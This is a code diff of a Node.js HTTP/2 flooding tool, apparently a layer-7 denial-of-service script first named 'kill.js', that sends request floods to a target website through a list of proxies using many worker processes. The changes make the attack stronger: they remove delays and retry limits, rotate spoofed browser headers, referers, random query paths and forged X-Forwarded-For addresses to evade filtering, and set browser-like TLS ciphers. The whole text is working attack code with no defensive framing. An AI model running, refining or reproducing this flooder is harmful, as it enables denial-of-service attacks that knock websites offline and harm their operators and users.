@@ -3,7 +3,6 @@ const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
-const crypto = require("crypto");
 const fs = require("fs");
 
 process.setMaxListeners(0);
@@ -11,20 +10,18 @@ require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', () => {});
 
 if (process.argv.length < 7) {
-    console.log(`Usage: node kill.js <target> <time> <rate> <threads> <proxyfile>`);
+    console.log("Usage: node script.js <target> <time> <rate> <threads> <proxy_file>");
     process.exit(1);
 }
 
-const headers = {};
-
 function readLines(filePath) {
     if (!fs.existsSync(filePath)) {
-        console.error(`File ${filePath} not found`);
+        console.log("Proxy file not found!");
         process.exit(1);
     }
-    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
-    if (lines.length === 0 || lines[0] === '') {
-        console.error(`Proxy file ${filePath} is empty`);
+    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
+    if (!lines.length) {
+        console.log("Proxy file is empty!");
         process.exit(1);
     }
     return lines;
@@ -57,40 +54,50 @@ const args = {
 
 const parsedTarget = url.parse(args.target);
 if (!parsedTarget.protocol || !parsedTarget.host) {
-    console.error('Invalid target URL');
+    console.log("Invalid target URL!");
     process.exit(1);
 }
 
-const sig = ['ecdsa_secp256r1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
-const accept_header = ['*/*', 'text/html', 'application/json'];
-const lang_header = ['en-US', 'vi-VN', 'zh-CN'];
-const encoding_header = ['gzip, deflate, br', 'deflate', 'gzip'];
-const version = ['"Google Chrome";v="113"', '"Microsoft Edge";v="113"', '"Firefox";v="91"'];
-const rateHeaders = [
-    { "akamai-origin-hop": randstr(12) },
-    { "via": randstr(12) },
-    { "x-forwarded-for": randstr(12) }
+const userAgents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15"
 ];
 
-const siga = randomElement(sig);
-const ver = randomElement(version);
-const accept = randomElement(accept_header);
-const lang = randomElement(lang_header);
-const encoding = randomElement(encoding_header);
+const accept_header = [
+    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "application/json, text/plain, */*"
+];
+const encoding_header = ["gzip, deflate, br"];
+const sec_fetch_headers = {
+    "sec-fetch-dest": ["document", "script"],
+    "sec-fetch-mode": ["navigate", "cors"],
+    "sec-fetch-site": ["same-origin", "cross-site"]
+};
+const cache_control = ["no-cache"];
+const referers = [
+    `https://${parsedTarget.host}/`,
+    "https://www.google.com/",
+    ""
+];
+
+const ciphers = [
+    "TLS_AES_128_GCM_SHA256",
+    "TLS_AES_256_GCM_SHA384",
+    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
+    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
+].join(":");
+
 const proxies = readLines(args.proxyFile);
 
 if (cluster.isMaster) {
-    console.clear();
-    console.log(`Target: ${parsedTarget.host}`);
-    console.log(`Duration: ${args.time}`);
-    console.log(`Threads: ${args.threads}`);
-    console.log(`RPS: ${args.Rate}`);
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
     setTimeout(() => process.exit(0), args.time * 1000);
 } else {
-    setInterval(runFlooder, 100);
+    setInterval(runFlooder, 0);
 }
 
 class NetSocket {
@@ -114,77 +121,83 @@ class NetSocket {
 
         connection.on("data", chunk => {
             const response = chunk.toString("utf-8");
-            const isAlive = response.includes("HTTP/1.1 200");
-            if (!isAlive) {
+            if (!response.includes("HTTP/1.1 200")) {
                 connection.destroy();
-                return callback(undefined, `error: invalid response from proxy ${options.host}:${options.port}`);
+                return callback(undefined, "invalid proxy response");
             }
-            return callback(connection, undefined);
+            return callback(connection);
         });
 
         connection.on("timeout", () => {
             connection.destroy();
-            return callback(undefined, `error: timeout exceeded for ${options.host}:${options.port}`);
+            callback(undefined, "timeout");
         });
 
-        connection.on("error", error => {
+        connection.on("error", () => {
             connection.destroy();
-            return callback(undefined, `error: ${error.message} for ${options.host}:${options.port}`);
+            callback(undefined, "error");
         });
     }
 }
 
 const Socker = new NetSocket();
-headers[":method"] = "GET";
-headers[":authority"] = parsedTarget.host;
-headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
-headers[":scheme"] = "https";
-headers["sec-ch-ua"] = ver;
-headers["sec-ch-ua-platform"] = "Windows";
-headers["accept-encoding"] = encoding;
-headers["accept-language"] = lang;
-headers["accept"] = accept;
-headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36";
+
+function generateDynamicPath() {
+    const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
+    const queries = [
+        `q=${encodeURIComponent(randstr(6))}`,
+        `id=${randomIntn(1000, 9999)}`,
+        `p=${randomIntn(1, 10)}`
+    ];
+    return `${basePath}?${randomElement(queries)}`;
+}
+
+function generateDynamicHeaders() {
+    const headers = {
+        ":method": "GET",
+        ":authority": parsedTarget.host,
+        ":path": generateDynamicPath(),
+        ":scheme": "https",
+        "user-agent": randomElement(userAgents),
+        "accept": randomElement(accept_header),
+        "accept-encoding": randomElement(encoding_header),
+        "sec-fetch-dest": randomElement(sec_fetch_headers["sec-fetch-dest"]),
+        "sec-fetch-mode": randomElement(sec_fetch_headers["sec-fetch-mode"]),
+        "sec-fetch-site": randomElement(sec_fetch_headers["sec-fetch-site"]),
+        "cache-control": randomElement(cache_control),
+        "referer": randomElement(referers),
+        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`
+    };
+    return headers;
+}
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
-    if (!parsedProxy[0] || !parsedProxy[1]) {
-        console.error(`Invalid proxy format: ${proxyAddr}`);
-        return setTimeout(runFlooder, 1000);
-    }
+    if (!parsedProxy[0] || !parsedProxy[1]) return setTimeout(runFlooder, 0);
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 5
+        timeout: 3
     };
-
-    let retryCount = 0;
-    const maxRetries = 5;
 
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
             if (connection) connection.destroy();
-            if (retryCount < maxRetries) {
-                retryCount++;
-                console.error(`Retrying (${retryCount}/${maxRetries}) for ${proxyAddr}: ${error}`);
-                setTimeout(runFlooder, 1000);
-            } else {
-                console.error(`Max retries reached for ${proxyAddr}`);
-            }
-            return;
+            return setTimeout(runFlooder, 0);
         }
 
         const tlsOptions = {
             secure: true,
-            ALPNProtocols: ['h2', 'http/1.1'],
-            ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
-            ecdhCurve: 'auto',
+            ALPNProtocols: ['h2'],
+            ciphers: ciphers,
             host: parsedTarget.host,
             servername: parsedTarget.host,
-            rejectUnauthorized: false
+            rejectUnauthorized: false,
+            minVersion: 'TLSv1.2',
+            maxVersion: 'TLSv1.3'
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -194,20 +207,16 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 2000,
+                maxConcurrentStreams: 100,
                 initialWindowSize: 6291456,
-                maxHeaderListSize: 65536,
-                enablePush: false
+                maxHeaderListSize: 65536
             },
             createConnection: () => tlsConn
         });
 
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
-                const dynHeaders = {
-                    ...headers,
-                    ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
-                };
+                const dynHeaders = generateDynamicHeaders();
                 for (let i = 0; i < args.Rate; i++) {
                     const request = client.request(dynHeaders);
                     request.on("response", () => {
@@ -220,7 +229,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 80);
+            }, 0);
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
@@ -228,14 +237,14 @@ function runFlooder() {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 1000);
+            setTimeout(runFlooder, 0);
         });
 
         client.on("close", () => {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 1000);
+            setTimeout(runFlooder, 0);
         });
     });
 }
